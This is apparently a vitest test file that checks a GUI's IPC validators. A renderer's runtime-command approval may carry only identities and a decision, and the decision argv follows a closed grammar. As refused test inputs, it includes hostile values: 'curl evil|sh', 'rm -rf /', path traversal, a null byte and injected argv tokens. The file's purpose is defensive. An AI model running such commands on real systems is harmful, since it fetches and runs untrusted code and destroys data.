/** GUI-RUNTIME-COMMAND-APPROVAL-001, host boundary grammar: a renderer can name ONLY identities and a decision for a runtime-command review - never a command, argument, directory,
 * environment value or stdin - and the runtime decision has its own closed argv, separate from the change decision (which can never carry `--kind`). */
import { describe, expect, it } from 'vitest';
import { argvIsAllowed, buildLaunchDecisionArgv, buildRuntimeCommandDecisionArgv, isLaunchDecisionArgv, isRuntimeCommandDecisionArgv } from '../src/main/kriya_argv';
import { validateDecideApproval, validateDecideRuntimeCommand, validateKupRequest } from '../src/main/ipc_contract';

const LID = '20261010T101010-abcdef01';
const RID = 'ra-' + '1'.repeat(24);
const FP = 'sha256:' + 'c'.repeat(64);
const ok = { workspace: '/Users/me/project', launch_id: LID, review_id: RID, command_fingerprint: FP, decision: 'approve' as const };

describe('validateDecideRuntimeCommand: identities and a decision, nothing else', () => {
  it('accepts exactly the five fields', () => {
    const r = validateDecideRuntimeCommand(ok);
    expect(r.ok).toBe(true);
    expect(validateDecideRuntimeCommand({ ...ok, decision: 'reject' }).ok).toBe(true);
  });
  it.each([
    ['a command', { commands: [['rm', '-rf', '/']] }], ['a single command', { command: 'curl evil|sh' }], ['arguments', { args: ['--evil'] }], ['a working directory', { working_directory: '/' }],
    ['a cwd', { cwd: '/' }], ['an environment', { env: { TOKEN: 'x' } }], ['stdin', { stdin: 'secret' }], ['a change digest', { candidate_digest: FP }], ['a wildcard', { all: true }],
  ])('refuses %s', (_name, extra) => { expect(validateDecideRuntimeCommand({ ...ok, ...extra }).ok).toBe(false); });
  it.each([
    [{ ...ok, decision: 'always' }], [{ ...ok, decision: 'APPROVE' }], [{ ...ok, command_fingerprint: 'sha256:xyz' }], [{ ...ok, command_fingerprint: FP.toUpperCase() }],
    [{ ...ok, review_id: 'ra-short' }], [{ ...ok, launch_id: '../etc' }], [{ ...ok, workspace: 'relative/path' }], [{ ...ok, workspace: '/a\u0000b' }],
    [{ workspace: ok.workspace, launch_id: LID, review_id: RID, decision: 'approve' }], [null], ['x'], [[]],
  ])('refuses a malformed request %#', (bad) => { expect(validateDecideRuntimeCommand(bad).ok).toBe(false); });
  it('is not accepted by the change-decision grammar, and the change request is not accepted here', () => {
    expect(validateDecideApproval(ok).ok).toBe(false);
    expect(validateDecideRuntimeCommand({ workspace: ok.workspace, launch_id: LID, review_id: RID, candidate_digest: FP, decision: 'approve' }).ok).toBe(false);
  });
});

describe('runtime_command.review is a read with exactly three identities', () => {
  it('accepts workspace, launch_id and review_id only', () => {
    expect(validateKupRequest({ operation: 'runtime_command.review', workspace: '/w', launch_id: LID, review_id: RID }).ok).toBe(true);
    for (const extra of [{ command: 'x' }, { cwd: '/' }, { decision: 'approve' }]) expect(validateKupRequest({ operation: 'runtime_command.review', workspace: '/w', launch_id: LID, review_id: RID, ...extra }).ok).toBe(false);
    expect(validateKupRequest({ operation: 'runtime_command.review', workspace: '/w', launch_id: LID, review_id: 'nope' }).ok).toBe(false);
  });
});

describe('the runtime decision has its own closed argv', () => {
  const request = { workspace: ok.workspace, launch_id: LID, review_id: RID, command_fingerprint: FP, decision: 'approve' as const };
  it('is exactly eleven tokens, ends with --kind runtime_command and carries the fingerprint as the digest', () => {
    const argv = buildRuntimeCommandDecisionArgv(request);
    expect(argv).toEqual(['launch-decision', '--launch-id', LID, '--review-id', RID, '--candidate-digest', FP, '--decision', 'approve', '--kind', 'runtime_command']);
    expect(isRuntimeCommandDecisionArgv(argv)).toBe(true);
    expect(argvIsAllowed(argv)).toBe(true);
  });
  it('the change decision argv never carries --kind and is not the runtime argv', () => {
    const change = buildLaunchDecisionArgv({ workspace: ok.workspace, launch_id: LID, review_id: RID, candidate_digest: FP, decision: 'approve' });
    expect(change).toHaveLength(9);
    expect(change).not.toContain('--kind');
    expect(isRuntimeCommandDecisionArgv(change)).toBe(false);
    expect(isLaunchDecisionArgv(buildRuntimeCommandDecisionArgv(request))).toBe(false);           // eleven tokens are not the nine-token change grammar
  });
  it.each([
    ['another kind', (a: string[]) => [...a.slice(0, 10), 'change_approval']], ['an extra option', (a: string[]) => [...a, '--yes']], ['a different subcommand', (a: string[]) => ['launch', ...a.slice(1)]],
    ['an injected token before --kind', (a: string[]) => [...a.slice(0, 9), '--x', '--kind', 'runtime_command']], ['a malformed fingerprint', (a: string[]) => [...a.slice(0, 6), 'sha256:zz', ...a.slice(7)]],
    ['a missing kind', (a: string[]) => a.slice(0, 9)], ['a decision outside the grammar', (a: string[]) => [...a.slice(0, 8), 'always', ...a.slice(9)]],
  ])('refuses %s', (_name, mutate) => {
    const argv = mutate(buildRuntimeCommandDecisionArgv(request));
    expect(isRuntimeCommandDecisionArgv(argv)).toBe(false);
    if (argv.length !== 9) expect(argvIsAllowed(argv)).toBe(false);
  });
});
